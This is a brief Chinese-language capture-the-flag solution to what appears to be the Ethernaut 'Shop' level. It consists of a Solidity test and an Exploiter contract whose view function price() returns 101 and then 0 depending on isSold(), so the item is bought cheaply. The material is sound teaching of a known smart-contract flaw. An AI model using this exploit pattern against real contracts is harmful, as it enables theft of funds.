view 函数不能修改合约状态，但可以读取合约状态并进行计算。通过读取 `level.isSold()`，对两次调用进行不同的处理即可。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Shop.sol";
import "src/levels/ShopFactory.sol";

contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Shop(levelAddress);

    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        Exploiter exploiter = new Exploiter();
        exploiter.buy(level);

        vm.stopPrank();
    }
}

contract Exploiter {
    Shop private level;

    function buy(Shop _level) external {
        level = _level;
        level.buy();
    }

    function price() external view returns (uint256) {
        return level.isSold() ? 0 : 101;
    }
}
```

